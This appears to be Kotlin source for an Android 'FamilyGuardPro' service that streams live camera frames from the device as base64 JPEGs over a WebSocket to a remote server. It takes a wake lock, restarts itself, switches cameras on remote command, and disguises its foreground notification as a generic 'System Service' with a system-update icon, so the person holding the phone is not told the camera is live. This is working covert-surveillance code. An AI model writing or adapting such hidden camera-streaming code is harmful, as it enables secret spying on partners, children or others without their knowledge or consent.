package com.familyguardpro.services

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.graphics.Matrix
import android.graphics.Rect
import android.graphics.YuvImage
import android.hardware.camera2.*
import android.media.Image
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.os.PowerManager
import android.util.Base64
import android.util.Log
import android.view.Surface
import androidx.core.app.NotificationCompat
import com.familyguardpro.FamilyGuardApp
import com.familyguardpro.R
import com.familyguardpro.network.ApiClient
import com.familyguardpro.utils.PreferenceManager
import kotlinx.coroutines.*
import org.java_websocket.client.WebSocketClient
import org.java_websocket.handshake.ServerHandshake
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.net.URI

/**
 * Camera streaming service that sends JPEG frames via WebSocket
 * This is easier to decode on the web dashboard than H.264
 */
class CameraStreamService : Service() {

    companion object {
        private const val TAG = "CameraStreamService"
        private const val NOTIFICATION_ID = 1004
        
        // Frame settings
        private const val FRAME_WIDTH = 640
        private const val FRAME_HEIGHT = 480
        private const val JPEG_QUALITY = 60 // Balance quality vs bandwidth
        private const val TARGET_FPS = 10 // 10 frames per second
        private const val FRAME_INTERVAL_MS = 1000L / TARGET_FPS
        private const val WAKELOCK_TAG = "FamilyGuard:CameraStream"
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var preferenceManager: PreferenceManager
    
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var backgroundHandler: Handler? = null
    private var backgroundThread: HandlerThread? = null
    
    private var webSocketClient: WebSocketClient? = null
    private var isStreaming = false
    private var lastFrameTime = 0L
    private var useFrontCamera = false
    private var wakeLock: PowerManager.WakeLock? = null

    override fun onCreate() {
        super.onCreate()
        preferenceManager = PreferenceManager(this)
        startBackgroundThread()
        acquireWakeLock()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // CRITICAL: Always call startForeground() first to avoid
        // ForegroundServiceDidNotStartInTimeException
        startForeground()
        
        when (intent?.action) {
            "START" -> {
                useFrontCamera = intent.getStringExtra("cameraId") == "1"
                startStreaming()
            }
            "STOP" -> {
                stopStreaming()
                stopSelf()
            }
            "SWITCH" -> {
                useFrontCamera = !useFrontCamera
                restartCamera()
            }
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        stopStreaming()
        stopBackgroundThread()
        releaseWakeLock()
    }

    private fun startForeground() {
        val notification = NotificationCompat.Builder(this, FamilyGuardApp.NOTIFICATION_CHANNEL_STREAMING)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(R.drawable.ic_system_update)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
        
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, notification, 
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("CameraStreamBackground").also { it.start() }
        backgroundHandler = Handler(backgroundThread!!.looper)
    }

    private fun stopBackgroundThread() {
        backgroundThread?.quitSafely()
        try {
            backgroundThread?.join()
            backgroundThread = null
            backgroundHandler = null
        } catch (e: InterruptedException) {
            Log.e(TAG, "Error stopping background thread", e)
        }
    }

    private fun startStreaming() {
        if (isStreaming) return
        isStreaming = true
        
        // Connect WebSocket first
        connectWebSocket {
            // Then open camera
            openCamera()
        }
    }

    private fun stopStreaming() {
        isStreaming = false
        
        captureSession?.close()
        captureSession = null
        
        cameraDevice?.close()
        cameraDevice = null
        
        imageReader?.close()
        imageReader = null
        
        webSocketClient?.close()
        webSocketClient = null
    }

    private fun restartCamera() {
        captureSession?.close()
        captureSession = null
        cameraDevice?.close()
        cameraDevice = null
        imageReader?.close()
        imageReader = null
        
        openCamera()
    }

    private fun connectWebSocket(onConnected: () -> Unit) {
        val baseUrl = ApiClient.BASE_URL
            .trimEnd('/')
            .replace("https://", "wss://")
            .replace("http://", "ws://")
        
        val deviceId = preferenceManager.getDeviceId()
        val sessionId = "${deviceId}_camera"
        val wsUrl = "$baseUrl/ws?session=$sessionId&role=sender&deviceId=$deviceId&type=camera"
        
        Log.d(TAG, "Connecting to WebSocket: $wsUrl")
        
        webSocketClient = object : WebSocketClient(URI(wsUrl)) {
            override fun onOpen(handshakedata: ServerHandshake?) {
                Log.d(TAG, "WebSocket connected")
                // Send stream started notification
                val startMsg = JSONObject().apply {
                    put("type", "stream_started")
                    put("deviceId", deviceId)
                    put("streamType", "camera")
                }
                send(startMsg.toString())
                onConnected()
            }

            override fun onMessage(message: String?) {
                // Handle commands from parent (e.g., switch camera)
                message?.let {
                    try {
                        val json = JSONObject(it)
                        when (json.optString("command")) {
                            "switch_camera" -> {
                                serviceScope.launch(Dispatchers.Main) {
                                    useFrontCamera = !useFrontCamera
                                    restartCamera()
                                }
                            }
                            else -> { /* ignore unknown commands */ }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error parsing message", e)
                    }
                }
            }

            override fun onClose(code: Int, reason: String?, remote: Boolean) {
                Log.d(TAG, "WebSocket closed: $reason")
                if (isStreaming) {
                    // Reconnect
                    serviceScope.launch {
                        delay(2000)
                        if (isStreaming) connectWebSocket(onConnected)
                    }
                }
            }

            override fun onError(ex: Exception?) {
                Log.e(TAG, "WebSocket error", ex)
            }
        }
        
        webSocketClient?.connect()
    }

    @SuppressLint("MissingPermission")
    private fun openCamera() {
        val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        
        try {
            // Find requested camera
            val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                val characteristics = cameraManager.getCameraCharacteristics(id)
                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                if (useFrontCamera) {
                    facing == CameraCharacteristics.LENS_FACING_FRONT
                } else {
                    facing == CameraCharacteristics.LENS_FACING_BACK
                }
            } ?: cameraManager.cameraIdList.first()
            
            Log.d(TAG, "Opening camera: $cameraId (front: $useFrontCamera)")
            
            // Setup ImageReader
            imageReader = ImageReader.newInstance(
                FRAME_WIDTH,
                FRAME_HEIGHT,
                ImageFormat.YUV_420_888,
                2
            ).apply {
                setOnImageAvailableListener({ reader ->
                    val image = reader.acquireLatestImage()
                    image?.let {
                        processFrame(it)
                        it.close()
                    }
                }, backgroundHandler)
            }
            
            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    createCaptureSession()
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    cameraDevice = null
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e(TAG, "Camera error: $error")
                    camera.close()
                    cameraDevice = null
                    
                    // Notify parent of error
                    webSocketClient?.let {
                        val errorMsg = JSONObject().apply {
                            put("type", "error")
                            put("error", "Camera error: $error")
                        }
                        it.send(errorMsg.toString())
                    }
                }
            }, backgroundHandler)
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to open camera", e)
            // Notify parent of error
            webSocketClient?.let {
                val errorMsg = JSONObject().apply {
                    put("type", "error")
                    put("error", "Failed to open camera: ${e.message}")
                }
                it.send(errorMsg.toString())
            }
        }
    }

    private fun createCaptureSession() {
        val camera = cameraDevice ?: return
        val surface = imageReader?.surface ?: return
        
        try {
            camera.createCaptureSession(
                listOf(surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        captureSession = session
                        startPreview()
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e(TAG, "Capture session configuration failed")
                    }
                },
                backgroundHandler
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to create capture session", e)
        }
    }

    private fun startPreview() {
        val camera = cameraDevice ?: return
        val session = captureSession ?: return
        val surface = imageReader?.surface ?: return
        
        try {
            val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                addTarget(surface)
                set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
            }
            
            session.setRepeatingRequest(
                captureRequest.build(),
                null,
                backgroundHandler
            )
            
            Log.d(TAG, "Camera preview started")
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start preview", e)
        }
    }

    private fun processFrame(image: Image) {
        // Rate limit frames
        val now = System.currentTimeMillis()
        if (now - lastFrameTime < FRAME_INTERVAL_MS) {
            return
        }
        lastFrameTime = now
        
        if (webSocketClient?.isOpen != true) return
        
        try {
            // Convert YUV to JPEG
            val jpeg = yuvToJpeg(image)
            
            // Send as base64 JSON message
            val base64 = Base64.encodeToString(jpeg, Base64.NO_WRAP)
            val frameMsg = JSONObject().apply {
                put("type", "camera_frame")
                put("frame", base64)
                put("timestamp", now)
                put("width", image.width)
                put("height", image.height)
            }
            
            webSocketClient?.send(frameMsg.toString())
            
        } catch (e: Exception) {
            Log.e(TAG, "Error processing frame", e)
        }
    }

    private fun yuvToJpeg(image: Image): ByteArray {
        val yBuffer = image.planes[0].buffer
        val uBuffer = image.planes[1].buffer
        val vBuffer = image.planes[2].buffer
        
        val ySize = yBuffer.remaining()
        val uSize = uBuffer.remaining()
        val vSize = vBuffer.remaining()
        
        val nv21 = ByteArray(ySize + uSize + vSize)
        
        yBuffer.get(nv21, 0, ySize)
        vBuffer.get(nv21, ySize, vSize)
        uBuffer.get(nv21, ySize + vSize, uSize)
        
        val yuvImage = YuvImage(nv21, ImageFormat.NV21, image.width, image.height, null)
        val out = ByteArrayOutputStream()
        yuvImage.compressToJpeg(Rect(0, 0, image.width, image.height), JPEG_QUALITY, out)
        
        return out.toByteArray()
    }
    
    @SuppressLint("WakelockTimeout")
    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                WAKELOCK_TAG
            ).apply {
                acquire()
            }
            Log.d(TAG, "Wake lock acquired for camera streaming")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to acquire wake lock", e)
        }
    }
    
    private fun releaseWakeLock() {
        try {
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                    Log.d(TAG, "Wake lock released")
                }
            }
            wakeLock = null
        } catch (e: Exception) {
            Log.e(TAG, "Failed to release wake lock", e)
        }
    }
}
